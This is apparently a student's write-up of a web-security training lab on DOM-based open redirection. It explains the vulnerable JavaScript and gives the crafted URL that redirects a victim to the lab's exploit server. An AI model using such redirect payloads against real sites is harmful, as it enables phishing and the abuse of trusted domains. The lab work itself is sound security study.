# Practitioner Lab 91: DOM-based open redirection

---

This lab contains a DOM-based open-redirection vulnerability. To solve this lab, exploit this vulnerability and redirect the victim to the exploit server.

![Untitled](Practitioner%20Lab%2091%20DOM-based%20open%20redirection%201daf88b6dcba4adfa829bad86721bf03/Untitled.png)

Looking at the source code I found the following. 

In javascript / with another / means a regular expression  so in this case the /url  has a regular expression. 

the location is just anything that is in the url. This is appended to the initial regex for https//

Lastly the location.href = returnURL ? returnUrl[1] : “/”  this is the ternary operator

basically an if statement that if it matches then return returnUrl[1] else then return. / 

I used the following but it did not solve the lab.

```
[https://0a5400390345e7f181782aa500ff0010.web-security-academy.net/post?postId=1#url=https://exploit-0a5b0093038ee7cf8132290b017000f2.exploit-server.net/](https://0a5400390345e7f181782aa500ff0010.web-security-academy.net/post?postId=1&url=https://exploit-0a5b0093038ee7cf8132290b017000f2.exploit-server.net/)[https://exploit-0a5b0093038ee7cf8132290b017000f2.exploit-server.net/](https://exploit-0a5b0093038ee7cf8132290b017000f2.exploit-server.net/)
```

it had the # and it did not solve i because the user still had to click back.

So I then used the & and this worked.

![Untitled](Practitioner%20Lab%2091%20DOM-based%20open%20redirection%201daf88b6dcba4adfa829bad86721bf03/Untitled%201.png)

```
[https://0a5400390345e7f181782aa500ff0010.web-security-academy.net/post?postId=1&url=https://exploit-0a5b0093038ee7cf8132290b017000f2.exploit-server.net/](https://0a5400390345e7f181782aa500ff0010.web-security-academy.net/post?postId=1&url=https://exploit-0a5b0093038ee7cf8132290b017000f2.exploit-server.net/)[https://exploit-0a5b0093038ee7cf8132290b017000f2.exploit-server.net/](https://exploit-0a5b0093038ee7cf8132290b017000f2.exploit-server.net/)
```

I used the & symbol and this worked.